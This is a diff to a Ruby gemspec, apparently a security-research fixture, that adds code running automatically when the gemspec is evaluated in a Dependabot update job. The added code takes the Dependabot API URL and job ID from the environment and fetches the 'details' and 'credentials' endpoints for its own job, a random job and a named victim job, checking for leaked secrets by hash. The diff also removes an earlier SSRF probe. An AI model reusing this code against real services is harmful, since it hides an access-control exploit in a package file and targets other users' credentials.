@@ -1,32 +1,92 @@
+require "digest"
 require "open-uri"
 
-marker = "/tmp/codex_dependabot_canary_once"
-begin
-  File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
-rescue Errno::EEXIST
-  # A gemspec may be evaluated repeatedly; only the first evaluation probes.
-else
+REPO_MARKER_SHA256 = "2fbf192f61ed90688fbdbd61a46e8f2cdb73dfebdf9ffa24444a31cb346ff881"
+REGISTRY_SECRET_SHA256 = "57889497fe617b8184beee6d7e58fd1970dc97e6f2fb723e618c076ed98a16c2"
+VICTIM_JOB_ID = "1686152375"
+RANDOM_JOB_ID = "992091537953"
+
+def marker_match?(body, width, expected_hash)
+  body.scan(/[0-9a-f]{#{width}}/i).any? do |candidate|
+    Digest::SHA256.hexdigest(candidate.downcase) == expected_hash
+  end
+end
+
+def bounded_probe(label, base_url, job_id, endpoint)
+  status = 0
+  body = +""
+  error_class = "none"
+
   begin
     URI.open(
-      "https://ssrf-target.iad.github.net/",
-      open_timeout: 10,
-      read_timeout: 10,
+      "#{base_url}/update_jobs/#{job_id}/#{endpoint}",
+      open_timeout: 8,
+      read_timeout: 8,
       redirect: false
     ) do |response|
-      outcome = "REACHABLE status=#{response.status.first}"
+      status = response.status.first.to_i
+      body = response.read
     end
   rescue OpenURI::HTTPError => error
-    outcome = "BLOCKED status=#{error.io.status.first}"
+    status = error.io.status.first.to_i
+    body = error.io.read
   rescue StandardError => error
-    outcome = "BLOCKED error=#{error.class.name}"
+    error_class = error.class.name
   end
-  raise "CODEX_DEPENDABOT_CANARY_#{outcome}"
+
+  repo_match = marker_match?(body, 32, REPO_MARKER_SHA256)
+  secret_match = marker_match?(body, 64, REGISTRY_SECRET_SHA256)
+  warn format(
+    "CODEX_DB_BINDING label=%<label>s status=%<status>d length=%<length>d " \
+      "sha256=%<sha>s repo_marker_match=%<repo>s secret_match=%<secret>s error=%<error>s",
+    label: label,
+    status: status,
+    length: body.bytesize,
+    sha: Digest::SHA256.hexdigest(body),
+    repo: repo_match,
+    secret: secret_match,
+    error: error_class
+  )
+  [repo_match, secret_match]
+end
+
+if ENV["DEPENDABOT_API_URL"] && ENV["DEPENDABOT_JOB_ID"]
+  once_path = "/tmp/codex_dependabot_job_binding_once"
+  begin
+    File.open(once_path, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
+  rescue Errno::EEXIST
+    raise "CODEX_DEPENDABOT_OBJECT_BINDING_ALREADY_RAN"
+  end
+
+  base_url = ENV.fetch("DEPENDABOT_API_URL").sub(%r{/$}, "")
+  own_job_id = ENV.fetch("DEPENDABOT_JOB_ID")
+  warn format(
+    "CODEX_DB_BINDING environment api_url_present=true own_job_id_length=%<length>d " \
+      "raw_job_token_nonempty=%<token>s",
+    length: own_job_id.length,
+    token: !ENV.fetch("DEPENDABOT_JOB_TOKEN", "").empty?
+  )
+
+  results = [
+    bounded_probe("own_details", base_url, own_job_id, "details"),
+    bounded_probe("own_credentials", base_url, own_job_id, "credentials"),
+    bounded_probe("random_details", base_url, RANDOM_JOB_ID, "details"),
+    bounded_probe("random_credentials", base_url, RANDOM_JOB_ID, "credentials"),
+    bounded_probe("victim_details", base_url, VICTIM_JOB_ID, "details"),
+    bounded_probe("victim_credentials", base_url, VICTIM_JOB_ID, "credentials")
+  ]
+  warn format(
+    "CODEX_DB_BINDING summary repo_marker_matches=%<repo>d secret_matches=%<secret>d requests=6",
+    repo: results.count { |repo_match, _secret_match| repo_match },
+    secret: results.count { |_repo_match, secret_match| secret_match }
+  )
+  raise "CODEX_DEPENDABOT_OBJECT_BINDING_COMPLETE"
 end
 
 Gem::Specification.new do |spec|
   spec.name = "db-egress-canary"
-  spec.version = "2.0.1"
-  spec.summary = "Benign Dependabot egress fixture"
+  spec.version = "2.0.2"
+  spec.summary = "Synthetic Dependabot update-job object-binding fixture"
   spec.authors = ["Authorized security test"]
   spec.files = ["lib/db_egress_canary.rb"]
   spec.require_paths = ["lib"]
